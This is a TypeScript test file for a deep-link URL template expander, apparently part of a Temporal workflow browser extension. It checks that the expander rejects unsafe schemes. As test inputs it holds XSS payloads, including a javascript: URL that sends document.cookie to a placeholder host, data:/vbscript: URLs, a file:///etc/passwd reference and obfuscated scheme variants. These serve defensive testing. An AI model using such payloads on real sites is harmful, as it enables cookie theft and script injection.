import { describe, expect, it } from 'vitest';

import {
    expandTemplate,
    KNOWN_TOKENS,
    safeHref,
    templateIsSafe,
    templateScope,
    templatesInScope,
    tokensIn,
    type DeepLinkActivity,
} from '../../src/deepLink';
import { normalizeExecutions } from '../../src/rows';
import { apiWorkflow, fakeRunId } from '../helpers';
import type { WorkflowRow } from '../../src/types';

const NOW_MS = Date.parse('2026-01-01T12:00:00Z');

function row(overrides: Parameters<typeof apiWorkflow>[0] = { workflowId: 'order-42' }): WorkflowRow {
    return normalizeExecutions([apiWorkflow(overrides)])[0]!;
}

const ACTIVITY: DeepLinkActivity = {
    activityId: 'charge-1',
    activityType: 'ChargeCard',
    attempt: 7,
    scheduledAtMs: Date.parse('2026-01-01T11:00:00Z'),
};

// The workflow-list context: a row and no activity, which is all a table row has.
const context = (r: WorkflowRow) => ({ namespace: 'sample-namespace', row: r, nowMs: NOW_MS });

// A single workflow's own page, where one activity is in scope as well.
const activityContext = (r: WorkflowRow, activity: DeepLinkActivity | null = ACTIVITY) => ({
    ...context(r),
    activity,
});

describe('expandTemplate', () => {
    it('percent-encodes by default and leaves :raw alone', () => {
        const r = row({ workflowId: 'order|42/A' });
        expect(expandTemplate('https://example.com/?q={workflowId}', context(r)).url).toBe(
            'https://example.com/?q=order%7C42%2FA',
        );
        expect(expandTemplate('https://example.com/?q={workflowId:raw}', context(r)).url).toBe(
            'https://example.com/?q=order|42/A',
        );
    });

    it('shifts a timestamp by the offset', () => {
        const r = row({ workflowId: 'x', startTime: '2026-01-01T00:00:00Z', closeTime: '2026-01-01T00:30:00Z' });
        const { url } = expandTemplate('{startTimeIso-10m}|{endTimeIso+1h}|{startTimeSec}', context(r));
        expect(url).toBe(
            [
                encodeURIComponent('2025-12-31T23:50:00.000Z'),
                encodeURIComponent('2026-01-01T01:30:00.000Z'),
                String(Date.parse('2026-01-01T00:00:00Z') / 1000),
            ].join('|'),
        );
    });

    it('treats a running workflow as ending now', () => {
        // The alternative — an empty end — silently truncates the log search at
        // the start time, which is the least useful window possible for a
        // workflow that is still going.
        const r = row({ workflowId: 'x', status: 'RUNNING', closeTime: null });
        const { url } = expandTemplate('{endTimeMs}', context(r));
        expect(url).toBe(String(NOW_MS));
    });

    it('reports an unknown token instead of pasting it into the URL', () => {
        const result = expandTemplate('https://example.com/?q={workflowId}&x={notAToken}', context(row()));
        expect(result.unknownTokens).toEqual(['{notAToken}']);
        // Left verbatim on purpose: substituting an empty string would produce a
        // URL that looks fine and searches for the wrong thing.
        expect(result.url).toContain('{notAToken}');
    });

    it('resolves every token it advertises', () => {
        // Guards the drift between the resolver's switch and the list the popup
        // shows. A token in the help text that the code cannot fill is a bug
        // report waiting to happen.
        //
        // Uses the fullest context there is — a row AND an activity — because the
        // popup lists both vocabularies. Which of them needs an activity is the
        // next test's job.
        const r = row({ workflowId: 'x', runId: fakeRunId(1), taskQueue: 'q' });
        for (const token of KNOWN_TOKENS) {
            const result = expandTemplate(`{${token}}`, activityContext(r));
            expect(result.unknownTokens, `token {${token}}`).toEqual([]);
        }
    });

    it('reports an activity token as unknown on a workflow-scoped context', () => {
        // A table row has no activity, so an activity template pasted into the
        // workflow list must SAY it cannot be filled rather than expand to a URL
        // that searches for nothing. This is the behaviour that lets the scope be
        // derived from the template instead of declared beside it.
        const r = row({ workflowId: 'x' });
        for (const token of ['activityId', 'activityType', 'activityAttempt', 'activityScheduledIso']) {
            const result = expandTemplate(`{${token}}`, context(r));
            expect(result.unknownTokens, `token {${token}}`).toEqual([`{${token}}`]);
        }
    });

    it('fills the activity tokens, offsets included', () => {
        const r = row({ workflowId: 'x' });
        const { url } = expandTemplate(
            '{activityType}|{activityId}|{activityAttempt}|{activityScheduledIso-10m}',
            activityContext(r),
        );
        expect(url).toBe(
            ['ChargeCard', 'charge-1', '7', encodeURIComponent('2026-01-01T10:50:00.000Z')].join('|'),
        );
    });

    it('reports an unknown token for an activity field Temporal has not filled', () => {
        // A PENDING activity has no attempt count in the history — Temporal does
        // not write ActivityTaskStarted until it has stopped retrying — so this is
        // the normal state and not a defect. Saying "attempt {activityAttempt}"
        // is honest; saying "attempt 0" or "attempt 1" would not be.
        const r = row({ workflowId: 'x' });
        const pending = { ...ACTIVITY, attempt: null, scheduledAtMs: null };
        const result = expandTemplate('{activityAttempt}{activityScheduledMs}', activityContext(r, pending));
        expect(result.unknownTokens).toEqual(['{activityAttempt}', '{activityScheduledMs}']);
    });

    it('refuses to hand back an href for a scheme that is not http(s)', () => {
        // The expanded url is still reported — the popup and the tooltip show it,
        // so the user can see what their template produced — but `href` is null,
        // and the href is the only one of the two that can do anything.
        const result = expandTemplate('javascript:alert(document.cookie)//{workflowId}', context(row()));
        expect(result.url).toContain('javascript:');
        expect(result.href).toBeNull();
    });

    it('refuses when the DATA supplies the scheme, not the template', () => {
        // A template of just {workflowId} puts a value the extension does not
        // control in the scheme position. Validating the template alone — which
        // is the tempting place to put this check — would pass this.
        const hostile = row({ workflowId: 'javascript:fetch("https://example.com/?c="+document.cookie)' });
        expect(templateIsSafe('{workflowId:raw}')).toBe(false);
        expect(expandTemplate('{workflowId:raw}', context(hostile)).href).toBeNull();
    });

    it('passes an ordinary https template through byte for byte', () => {
        // A validator, not a normaliser: re-serialising the URL would re-encode
        // parts of the query, and log tools are particular about that.
        const template = 'https://example.com/search?q={workflowId:raw}&pipe=a|b';
        const { url, href } = expandTemplate(template, context(row({ workflowId: 'order|42' })));
        expect(href).toBe(url);
        expect(href).toBe('https://example.com/search?q=order|42&pipe=a|b');
    });
});

describe('safeHref', () => {
    it('allows http and https, and nothing else', () => {
        expect(safeHref('https://example.com/x')).toBe('https://example.com/x');
        expect(safeHref('http://localhost:8233/namespaces/default/workflows')).toBe(
            'http://localhost:8233/namespaces/default/workflows',
        );
        for (const bad of [
            'javascript:alert(1)',
            'JavaScript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'blob:https://example.com/1234',
            'file:///etc/passwd',
            'vbscript:msgbox(1)',
        ]) {
            expect(safeHref(bad), bad).toBeNull();
        }
    });

    it('sees through the characters the href setter itself ignores', () => {
        // The URL parser strips tabs, newlines and leading control characters,
        // and so does an href. A check that pattern-matched the start of the
        // string would pass this and the browser would still run it.
        expect(safeHref('java\nscript:alert(1)')).toBeNull();
        expect(safeHref('\u0001javascript:alert(1)')).toBeNull();
        expect(safeHref('  javascript:alert(1)  ')).toBeNull();
    });

    it('declines a relative URL rather than resolving it against Temporal', () => {
        // Nobody's log tool lives on cloud.temporal.io, so a base to resolve
        // against would be a guess, and the guess would be wrong.
        expect(safeHref('/search?q=x')).toBeNull();
        expect(safeHref('example.com/search')).toBeNull();
        expect(safeHref('')).toBeNull();
    });
});

describe('templateScope', () => {
    it('reads the scope off the template rather than being told it', () => {
        expect(templateScope('https://example.com/?q={workflowId}')).toBe('workflow');
        expect(templateScope('https://example.com/?q={workflowId}+{activityType}')).toBe('activity');
        // No tokens at all is still a workflow link: a fixed dashboard URL is a
        // perfectly reasonable per-row button.
        expect(templateScope('https://example.com/dashboard')).toBe('workflow');
    });

    it('does not treat a misspelled activity token as activity-scoped', () => {
        // Membership of the known list decides, not the prefix. `{activityTyp}`
        // stays an unknown token on a workflow-scoped link — where the user can see
        // it — instead of silently moving the button to a page they were not
        // editing, which is what a startsWith('activity') test would have done.
        expect(templateScope('https://example.com/?q={activityTyp}')).toBe('workflow');
        expect(expandTemplate('https://example.com/?q={activityTyp}', context(row())).unknownTokens).toEqual([
            '{activityTyp}',
        ]);
    });

    it('splits a settings list into the two places its buttons belong', () => {
        const templates = [
            { label: 'Workflow logs', urlTemplate: 'https://example.com/?q={workflowId}' },
            { label: 'Activity logs', urlTemplate: 'https://example.com/?q={workflowId}+{activityId}' },
            { label: 'Dashboard', urlTemplate: 'https://example.com/dashboard' },
        ];
        expect(templatesInScope(templates, 'workflow').map((t) => t.label)).toEqual(['Workflow logs', 'Dashboard']);
        expect(templatesInScope(templates, 'activity').map((t) => t.label)).toEqual(['Activity logs']);
    });
});

describe('tokensIn', () => {
    it('lists each token once, in the order it appears', () => {
        expect(tokensIn('{endTimeIso}/{workflowId}?a={workflowId:raw}&b={startTimeMs-1h}')).toEqual([
            'endTimeIso',
            'workflowId',
            'startTimeMs',
        ]);
    });

    it('shares the regex with the expansion, so it cannot disagree about a match', () => {
        // '{startTimeMs+99}' has no unit and is therefore not a token at all —
        // neither here nor in expandTemplate, which is the point of reusing the
        // regex rather than writing a second, looser one.
        expect(tokensIn('{startTimeMs+99} {notAToken}')).toEqual(['notAToken']);
        // Called twice on purpose: a shared global regex carries `lastIndex`
        // between calls, and the second call would start mid-string.
        expect(tokensIn('{workflowId}')).toEqual(['workflowId']);
        expect(tokensIn('{workflowId}')).toEqual(['workflowId']);
    });
});

describe('expandTemplate offsets', () => {
    it('ignores an unparseable offset rather than shifting by a wrong amount', () => {
        const r = row({ workflowId: 'x', startTime: '2026-01-01T00:00:00Z' });
        // '{startTimeMs+99}' has no unit, so the token regex does not match it at
        // all: it stays verbatim and is not silently treated as milliseconds.
        expect(expandTemplate('{startTimeMs+99}', context(r)).url).toBe('{startTimeMs+99}');
    });
});
